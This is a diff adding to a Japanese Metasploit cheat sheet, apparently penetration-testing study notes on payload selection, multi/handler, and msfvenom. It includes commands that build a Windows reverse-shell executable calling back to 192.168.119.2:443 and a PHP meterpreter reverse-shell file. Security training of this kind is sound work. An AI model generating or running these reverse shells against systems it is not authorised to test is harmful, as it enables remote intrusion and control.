@@ -141,4 +141,44 @@ session -i 2のようにしてsessionIdを指定して再度セッションに�
 
 19. 現在useしているエクスプロイトで使えるpayloadを一覧表示する。 ファイル名に/がついているとステージングのペイロード。  
 非ステージングpayloadの方がNWトラフィックが発生しづらい。つまり_の方のファイル。
+
+20. 現在選択しているエクスプロイトの中で利用できるpayloadsを一覧で表示する
+```
+show payloads
+```
+
+21. show payloadsで表示された中から、インデックス番号で使用するpayloadを選択する。
+```
+set payload 3
+```
+
+22. ペイロードにmulti/handlerを使用する。multi/handlerは、ステージングされたペイロードと非ステージングのペイロード双方において、より高度な対話シェルを可能にする。  
+ターゲット侵害できるときに、rlwrap netcat -lvnpの代わりとかで使える。
+```
+use multi/handler
+```
+
+
+#### msfvenom
+**msfvenom**はMetasploitが提供する機能の一つで、**ペイロードを生成するスタンドアロンツールとしてMetasploitに含まれている。**  
+  
+
+1. WindowsとTCPリバースシェルを行うためのwindows x64バイナリを生成するため、-lオプションですべてのペイロードのリストを表示する。
+```
+msfvenom -l payloads --platform windows --arch x64
+```
+
+2. NWトラフィックが発生しづらいとされる非ステージングのペイロードを生成する。
+```
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.119.2 LPORT=443 -f exe -o nonstaged.exe
+```
+
+3. msfvenomで利用できるすべてのペイロードを一覧表示する。
+```
+msfvenom --list payloads
+```
+
+4. phpのリバースシェルを生成する。
+```
+msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.php
 ```
